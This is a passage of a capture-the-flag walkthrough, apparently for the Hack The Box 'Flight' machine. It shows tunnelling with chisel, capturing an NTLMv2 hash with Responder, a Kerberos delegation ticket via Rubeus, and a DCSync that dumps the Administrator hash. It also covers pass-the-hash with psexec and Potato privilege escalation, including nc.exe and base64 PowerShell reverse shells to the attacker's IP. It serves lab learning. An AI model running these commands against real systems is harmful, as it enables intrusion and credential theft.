- If we could then we couldve just curl'd to the reverse shell in our target itself but since we can't we use a tool to tunnel the localhost to our machine through a port
- **NEW TOOL**: We get chisel:
- https://github.com/jpillora/chisel/releases
- windows (client/ our target)
- linux (server)
- We turn on our python server like before and grab the windows file from our target:
```bash
curl "http://10.10.14.25:8001/chisel_1.10.1_windows_amd64" -o chisel.exe
```
- We run the chisel executable on our linux as a server:
```bash
chmod +x chisel_1.10.1_linux_amd64
./chisel_1.10.1_linux_amd64 server -p 9001 --reverse
```
- We run the chisel as a client on our windows target to connect to us and allow us to connect to localhost:8000 via port 8002:
```bash
./chisel.exe client 10.10.14.25:9001 R:8002:127.0.0.1:8000
```
- With this we create a tunnel for our commands to reach the localhost where development exists
- To check we can curl the localhost from 8002 port:
```bash
curl localhost:8002
```
- We get a page
- Now we can turn on our netcat listener at the port we set for the aspx reverse shell and then curl that file:
```bash
nc -lvnp 9898

--ON-ANOTHER-SHELL--
curl localhost:8002/reverse.aspx
```
- We get a reverse shell as default app pool (iis) 
- It is a system account
- We can check by turning responder on and trying to reach a share like before:
```bash
sudo responder -I tun0

---ON-TARGET---
//10.10.14.25/rocknrj/test

---OUTPUT-RESPONDER---
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:63c0693774e676d9:E4304821BF4E2642FEA7DFA14B7A9E79:010100000000000080EA0ABA6AB5DB011B7FACB01F87BD9C0000000002000800430045004D004E0001001E00570049004E002D003400550032003500440034003100310050004F00530004003400570049004E002D003400550032003500440034003100310050004F0053002E00430045004D004E002E004C004F00430041004C0003001400430045004D004E002E004C004F00430041004C0005001400430045004D004E002E004C004F00430041004C000700080080EA0ABA6AB5DB01060004000200000008003000300000000000000000000000003000009CD2C6730FF4EBA70E7787ED292D7D35738CBC1C681ED2750A8444DCBA702ABD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000
```
- Shows we are account GO$
- alternatively we can use laudanum shell and access it via the url and then pass the nc.exe command to gain a shell
- After uploading laudanum shell enter this in url while having nc listening:
```bash
C:\ProgramData\nc.exe -e powershell.exe 10.10.14.25 9998
```
- For a better shell type this instead for listening:
```bash
rlwrap nc -lvnp 9998
```
## Privilege Escalation
- On enumerating we pass whoami /all and see we have SeImpersonatePrivilege:
```bash
whoami /all
USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
- We could use JuicyPotato or RottenPotato to abuse SeImpersonatePrivilege
- Since we are system account we could abuse this by using TGT Delegation to get a ticket for this account.
- then we can use sercretsdump for DCSync
- To do this we use rubeus to get a tgt from this account as it's a system account and then perform DCSync to grab admin hash
- We grab Rubeus.exe from our local macine and run it to see if it works/shows no errors.
```bash
cd C:\ProgramData
curl "http://10.10.14.25:8001/Rubeus.exe" -o "Rubeus.exe"
.\Rubeus.exe
```
- Then we get the ticket:
```bash
.\Rubeus.exe tgtdeleg /nowrap

---OUTPUT---

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: nbdKnoQwUFTInnJTTEHjzbhPnIBMrQr9YVezTQ39AVc=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECk8LT8Nhz3Ls3GwYC3xIuyKAQboiU+xAWtq66PSdR1CmTJC5lE50UUC1orrrku5YK1tlysbJRSNqTs12pbHaDkdBZRK5j2FUIOLjeXRpBEdotuI/SuatvCz2pyRlRjXbPEoFzvv7nbHnywQwpID1r4RnSWt5oisNwewvVwejEfl499wNHesk6CWD9PalQDTUWqhIsOkg6ZHjUym6c3/+KNf4LrJNCXxY1NgvARtFh7FQP0keR0m9Vv1KF54X/tmJAG+S2kVQqi9KiIHB9kbesRjH+5NBdeoTbWHK2VLTezCrcHyEz6DdBA4nTp3waltbFR2RSGhUBqItRQZZGoFqYYo6BWkKA0w2ly47PEF4zYtl4q/gO1hQGhjFtYgIv9XHz5fuJ7RmisB6SIRodaOUM6f0AEmPrPxQjwOcl9btR8fWvuetZ9mPwqYbfCM5U0kqFQHhp7HacFf7SUqBIS19QCWx/3R85GSrjT8L7jr3gtIDWLgqMEUy4jPCKlpaXMg3F1Yf+vlupxWAzcC1FkI3zn/cWKgnGNzHnFZ0kaT968QOIm/KtBK2mFLuUIiYiJ35EDMq4FooyEcBO8fbE20WiO5n+k/H69LBrCBpPMCe0musW36BkHiAumwUbgE/5p4j9fZ2n78ONLLivwlb4Dod+kYokdp2B2uvediC1A77SfajvCWXB63XRF56iGo6doikWnFU2P5PRE1TKYpujnCAw6vzDSTMlyGJUi80OnB4CRrdOb0HfRV8QtGimn93raHTQRVsM+IjUounjlWRP1HTwEbjvm2UmTSJQgG7t2auJYjr2VovmV4yHBj5hvr1itiHgdCjUdZ09CxyrEhBy1ePw2CBvbDrorzaG5lkjw0VrH/akNBfxUn6BGqm/qJD1Zmnl6CNBhwTRHrjVYw5ZfSLWTQGgK/8sVYLN5C9Ev/yhIh8LyfnGKczY+KeHW3NcpxGooopW2gPmIp5N2JBuzTxZEKwf/YxznMjs3m3uW5xd7dHBYf3e6d1hCuSCFqeqMZKWqLIx62PbAm3PpGahgV1N4Y827ZGnhVzuOsjKUD0zupC7+JigKn66Iwu3V5tS9cAKD+DmP6y/LksKnKirqwygMFkHHwibsM3bk1gwox9LJtEzS/wd1gqKQoHcPRxfP/gEKTrCkSm/l46F9z8hZbSnYnveOuz1S9XSvOeII7IN5Ip4HSP8aQjkOJQjUi4JFuK/fcTXwZIFK1+/Pf4B4A8Ixry9LGvKjdDCh1yGDTrIPfYw68GshXZxHL7u2fB478x0feowU4i2aHMGf5Te64hWGaLEBe86nQHbgtiIrCmOUnEqKaZsD9wnFLaW7q9ye3CXCS8QapD16z8Lj3i5CeBCKTz+r8v5Ad3+EnIo4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgORCZRFg/XfjZBd2UMI1ZiY17jmyUbaWdrGhdxqWgvaqhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MDQyNTAxNTExOVqmERgPMjAyNTA0MjUxMTUxMTlapxEYDzIwMjUwNTAyMDE1MTE5WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```
- We grab the data and store it in a file:
```bash
vi ticket.kirbi # copy content here
```
- Then using kirbi2ccache.py (https://github.com/skelsec/minikerberos/blob/main/minikerberos/examples/kirbi2ccache.py) I try to convert it but it fails. This is because the file is encoded.
```bash
mv ticket.kirbi ticket.kirbi.b64
base64 -d ticket.kirbi.b64 > ticket.kirbi
python3 kirbi2ccache.py ticket.kirbi ticket.ccache

---OUTPUT---
INFO:root:Parsing kirbi file /home/kali/Downloads/Windows/ActiveDirectory/Flight/www/ticket.kirbi
INFO:root:Done!

```
- Using this ticket we can perform DCSync and grab the Administrator hash (FAILS)
```bash
export KRB5CCNAME=ticket.ccache
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator

---OUTPUT-FAIL---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
```
- As we see it's a clock skew error so we sync our clock with the target and try again
```bash
sudo ntpdate 10.10.11.187
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```
- We can psexec into the machine using Pass the Hash (can use netexec smb to check and we will get pwned)
- winrm doesn't work but if we check the processes, the port is listening...so maybe due to firewall
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c administrator@10.10.11.187

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.11.187.....
[*] Found writable share ADMIN$
[*] Uploading file svOVNMRK.exe
[*] Opening SVCManager on 10.10.11.187.....
[*] Creating service sBQs on 10.10.11.187.....
[*] Starting service sBQs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
- We can grab root flag.
-------
--------
## Using Potato to exploit SeImpersonatePrivilege
- I tried JuicyPotato but it kept failing...so I used GodPotato..
- tried to get a reverse shell with nc.exe but that didn't work...probably cause its not owned by system? not sure
### GodPotato
- **Copy root flag without becoming admin**
```bash
.\gp.exe -cmd "C:\windows\system32\cmd.exe /c type c:\users\administrator\desktop\root.txt > c:\ProgramData\root.txt"

---OUTPUT---
[*] CombaseModule: 0x140717067141120
[*] DispatchTable: 0x140717069447232
[*] UseProtseqFunction: 0x140717068823760
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\8852b9a8-1c6e-45a6-b854-80a59ac63d47\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002002-1a94-ffff-9869-6e18801d4fbb
[*] DCOM obj OXID: 0xd6fe4737a258ca98
[*] DCOM obj OID: 0xf195d858b7ba78ff
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 908 Token:0x656  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4456

```
- Alternatively can directly read:
```bash
.\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"


---OUTPUT---
[*] CombaseModule: 0x140715642716160
[*] DispatchTable: 0x140715645022272
[*] UseProtseqFunction: 0x140715644398800
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\eb522b0f-b2b3-42eb-b8e6-a0ca9b0f09f8\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001402-0b88-ffff-eb2a-fdc4db70e355
[*] DCOM obj OXID: 0x139b19b6e7972bf4
[*] DCOM obj OID: 0xc8b5791c23b68d5c
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 916 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1592
59bae7323691879f79e1f814e0114215
```
- **Reverse PowerShell base64 command**
- got a one liner from here (Reverse>Powershell #3 Base64 for my IP): https://www.revshells.com/
```bash
.\gp.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ACIALAA5ADkAOQA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
- With netcat listening on my relevant port:
```bash
nc -lvnp 9997

---OUTPUT---
nc -lvnp 9997
listening on [any] 9997 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.187] 49785

PS C:\ProgramData> whoami
nt authority\system
```
- **Reverse Shell with netcat**
```bash
.\gp.exe -cmd "C:\windows\system32\cmd.exe /c C:\ProgramData\nc.exe -e C:\windows\system32\cmd.exe 10.10.14.25 9997"

---OUTPUT---
[*] CombaseModule: 0x140715642716160
[*] DispatchTable: 0x140715645022272
[*] UseProtseqFunction: 0x140715644398800
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\58349398-6265-4c5b-bbfb-b4eb501f8eea\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009c02-076c-ffff-c9d9-243db9f8415a
[*] DCOM obj OXID: 0xe5323863d60d0c90
[*] DCOM obj OID: 0xf4d29058ade08cfe
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 916 Token:0x816  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5132
```
- I try this command but it fails:
```bash
.\JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd

---OUTPUT---
./JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd'
'.' is not recognized as an internal or external command,
operable program or batch file.

C:\ProgramData>.\JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd'
.\JuicyPotatoNG.exe -t * -p "C:\ProgramData\nc.exe" -a '10.10.14.25 9997 -e cmd'


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag.
```
- I'm thinking maybe my netcat executable isn't comptaible ? as some walkthrough's did this. However I can still get reverse shell with GodPotato which does exploit SeImpersonate privileges.
- can also try with :
- https://github.com/CCob/SweetPotato
## Possibility for why JuicyPotato isn't working:
- Systeminfo:
```bash
systeminfo

---RELEVANT-OUTPUT---
Host Name:                 G0
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
```
- JuicyPotato relies on a legacy COM service behavior that was patched starting with Windows 10 1809 and Windows Server 2019.
## Extras
- https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
- Different potatoes 
- roguepotato seems like a close similarity with juicypotato but more new
- 
----
- .\gp.exe -cmd whoami 
- shows it works
----

---
.\gp.exe -cmd "cmd /c reverse.exe"


----

